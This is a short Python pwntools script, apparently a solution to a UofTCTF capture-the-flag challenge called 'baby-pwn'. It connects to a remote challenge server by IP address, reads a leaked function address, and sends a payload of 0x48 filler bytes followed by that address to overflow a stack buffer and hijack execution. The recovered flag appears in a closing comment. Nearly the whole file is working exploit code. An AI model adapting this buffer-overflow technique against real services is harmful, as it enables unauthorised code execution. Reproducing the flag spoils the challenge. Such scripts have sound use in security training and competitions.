#!/usr/bin/env python3

from pwn import *

#context.log_level = "debug"
elf = ELF("./baby-pwn", checksec=False)
context.binary = elf

#p = elf.process()
#p = elf.debug(gdbscript="")
p = remote("34.162.142.123", 5000)

p.readuntil(b"secret: ")
elf.sym["secret"] = int(p.readline().decode(), 16)

payload = b"A" * 0x48
payload += p64(elf.sym["secret"])
p.sendlineafter(b"Enter some text: ", payload)

p.readuntil(b"flag: ")
log.success(p.readline().decode())
# uoftctf{buff3r_0v3rfl0w5_4r3_51mp13_1f_y0u_kn0w_h0w_t0_d0_1t}
